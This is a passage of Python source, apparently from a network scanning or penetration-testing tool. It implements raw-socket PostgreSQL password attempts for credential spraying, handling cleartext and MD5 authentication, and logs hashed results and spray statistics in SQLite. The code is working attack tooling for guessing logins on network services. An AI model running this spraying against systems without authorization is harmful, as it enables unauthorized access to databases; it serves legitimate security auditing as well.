        Attempt PostgreSQL password authentication over raw socket.

        Implements the PostgreSQL startup message and MD5/cleartext auth flow.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.settimeout(self.timeout)
            sock.connect((ip, port))

            # Build StartupMessage
            # Protocol version 3.0
            startup_payload = struct.pack(">HH", 3, 0)
            startup_payload += b"user\x00" + username.encode("utf-8") + b"\x00"
            startup_payload += b"database\x00" + b"postgres" + b"\x00"
            startup_payload += b"\x00"  # Terminator

            # Length includes itself (4 bytes)
            startup_msg = struct.pack(">I", len(startup_payload) + 4) + startup_payload
            sock.sendall(startup_msg)

            # Receive auth request
            auth_resp = sock.recv(4096)

            if len(auth_resp) < 9:
                return False

            # Parse response: type (1 byte) + length (4 bytes) + data
            msg_type = chr(auth_resp[0])

            if msg_type == "R":  # Authentication request
                auth_type = struct.unpack(">I", auth_resp[5:9])[0]

                if auth_type == 0:
                    # AuthenticationOk — no password needed!
                    return True

                elif auth_type == 3:
                    # AuthenticationCleartextPassword
                    pwd_msg = b"p"
                    pwd_payload = password.encode("utf-8") + b"\x00"
                    pwd_msg += struct.pack(">I", len(pwd_payload) + 4)
                    pwd_msg += pwd_payload
                    sock.sendall(pwd_msg)

                elif auth_type == 5:
                    # AuthenticationMD5Password
                    salt = auth_resp[9:13]

                    # md5(md5(password + username) + salt)
                    inner = hashlib.md5(password.encode("utf-8") + username.encode("utf-8")).hexdigest().encode("utf-8")
                    outer = b"md5" + hashlib.md5(inner + salt).hexdigest().encode("utf-8")

                    pwd_msg = b"p"
                    pwd_payload = outer + b"\x00"
                    pwd_msg += struct.pack(">I", len(pwd_payload) + 4)
                    pwd_msg += pwd_payload
                    sock.sendall(pwd_msg)

                else:
                    # Unsupported auth type (SCRAM, GSS, etc.)
                    return False

                # Read auth result
                result = sock.recv(4096)

                if len(result) >= 9:
                    result_type = chr(result[0])
                    if result_type == "R":
                        result_auth = struct.unpack(">I", result[5:9])[0]
                        if result_auth == 0:
                            return True
                    elif result_type == "E":
                        # Error response — auth failed
                        return False

                return False

            elif msg_type == "E":
                # Error (maybe role doesn't exist)
                return False

            return False

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            logger.debug(f"PostgreSQL connection failed to {ip}:{port}: {e}")
            return False
        finally:
            try:
                sock.close()
            except OSError:
                pass

    # ─── Storage & Retrieval ──────────────────────────────────────────────

    def _store_result(self, host_id: int, port: int, service: str, username: str, password: str, success: bool):
        """
        Store credential spray result in the database.

        Passwords are SHA-256 hashed before storage — plaintext is NEVER persisted.
        """
        credential_hash = self._hash_password(password)
        timestamp = datetime.now(timezone.utc).isoformat()

        conn = sqlite3.connect(self.db_path, timeout=30)
        conn.execute("PRAGMA busy_timeout=30000")
        try:
            conn.execute(
                """
                INSERT INTO credential_results
                (host_id, port, service, username, credential_hash, success, tested_at)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
                (host_id, port, service, username, credential_hash, 1 if success else 0, timestamp),
            )
            conn.commit()
        finally:
            conn.close()

    def get_successful_creds(self) -> List[Dict]:
        """
        Return all successful credential findings.

        Returns:
            List of dictionaries with ip, port, service, username, and timestamp.
            Note: passwords are NOT returned — only their SHA-256 hash.
        """
        conn = sqlite3.connect(self.db_path, timeout=30)
        conn.execute("PRAGMA busy_timeout=30000")
        conn.row_factory = sqlite3.Row
        try:
            cursor = conn.execute("""
                SELECT h.ip, c.port, c.service, c.username, c.credential_hash, c.tested_at
                FROM credential_results c
                JOIN hosts h ON h.id = c.host_id
                WHERE success = 1
                ORDER BY c.tested_at DESC
            """)
            results = []
            for row in cursor.fetchall():
                results.append(
                    {
                        "ip": row["ip"],
                        "port": row["port"],
                        "service": row["service"],
                        "username": row["username"],
                        "credential_hash": row["credential_hash"],
                        "tested_at": row["tested_at"],
                    }
                )
            return results
        finally:
            conn.close()

    def get_spray_stats(self) -> Dict:
        """Get summary statistics of credential spraying activity."""
        conn = sqlite3.connect(self.db_path, timeout=30)
        conn.execute("PRAGMA busy_timeout=30000")
        try:
            total = conn.execute("SELECT COUNT(*) FROM credential_results").fetchone()[0]
            successful = conn.execute("SELECT COUNT(*) FROM credential_results WHERE success = 1").fetchone()[0]
            unique_hosts = conn.execute("SELECT COUNT(DISTINCT host_id) FROM credential_results").fetchone()[0]
            last_attempt = conn.execute("SELECT MAX(tested_at) FROM credential_results").fetchone()[0]

            return {
                "total_attempts": total,
                "successful": successful,
                "failed": total - successful,
                "unique_hosts_tested": unique_hosts,
                "last_attempt": last_attempt,
                "success_rate": f"{(successful / total * 100):.1f}%" if total > 0 else "0%",
            }
        finally:
            conn.close()
